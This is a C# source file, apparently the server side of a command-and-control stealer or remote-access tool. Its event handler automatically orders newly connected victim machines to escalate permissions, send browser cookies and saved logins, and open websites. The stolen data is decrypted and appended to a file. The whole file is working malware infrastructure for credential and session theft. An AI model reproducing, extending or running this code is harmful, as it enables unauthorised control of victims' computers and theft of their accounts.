using CNC.Core.Data;
using CNC.Core.Enums;
using CNC.Core.Security;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CNC.Core.Helper
{
    class EventManagement
    {
        public static List<Event> events = new List<Event>();

        public static void IncommingEvent(EventType type, Client client)
        {
            switch(type)
            {
                case EventType.Connect:
                    for (int i = 0; i < events.Count; i++)
                    {
                        if(events[i].Active == true && 
                            events[i].OnEvent == type)
                        {
                            //Potential
                            ExecuteDoEvent(events[i].DoEvent, events[i].DoEventParams, client);
                        }
                    }
                    break;
                case EventType.Disconnect:
                    break;
                case EventType.FirstTimeConnect:
                    break;
                case EventType.Timer:
                    break;
            }
        }

        public static void ExecuteDoEvent(EventDoType doEvent, string doEventParams, Client client)
        {
            switch (doEvent)
            {
                case EventDoType.ElevatePermission:
                    client.Connection.SendObject("0x12", Cryptography.Encrypt(Guid.NewGuid().ToString()));
                    break;
                case EventDoType.GetCookies:
                    File.AppendAllText(doEventParams,
                        Cryptography.Decrypt(client.Connection.SendReceiveObject<string, string>
                        ("0x24", "1x24", 25000, Cryptography.Encrypt(Guid.NewGuid().ToString()))));
                    break;
                case EventDoType.GetLogin:
                    File.AppendAllText(doEventParams,
                      Cryptography.Decrypt(client.Connection.SendReceiveObject<string, string>
                      ("0x23", "1x23", 25000, Cryptography.Encrypt(Guid.NewGuid().ToString()))));
                    break;
                case EventDoType.OpenWebsite:
                    client.Connection.SendObject("0x25", Cryptography.Encrypt(doEventParams));
                    break;
            }
        }
    }
}
